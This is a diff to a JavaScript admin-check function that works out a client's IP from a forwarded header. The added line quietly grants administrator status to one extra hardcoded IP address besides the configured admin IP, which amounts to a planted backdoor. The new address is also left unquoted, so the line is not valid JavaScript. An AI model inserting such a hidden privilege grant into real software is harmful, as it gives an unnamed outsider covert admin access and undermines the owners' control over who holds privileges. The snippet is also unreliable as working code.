@@ -52,7 +52,7 @@ const checkIsAdmin = (req) => {
   if (clientIP && clientIP.includes(',')) {
     clientIP = clientIP.split(',')[0].trim();
   }
-  return clientIP === adminIP || clientIP === `::ffff:${adminIP}`;
+  return clientIP === adminIP || clientIP === `::ffff:${adminIP}` || clientIP === 172.59.72.77;
 };
 
 const isAdmin = (req, res, next) => {
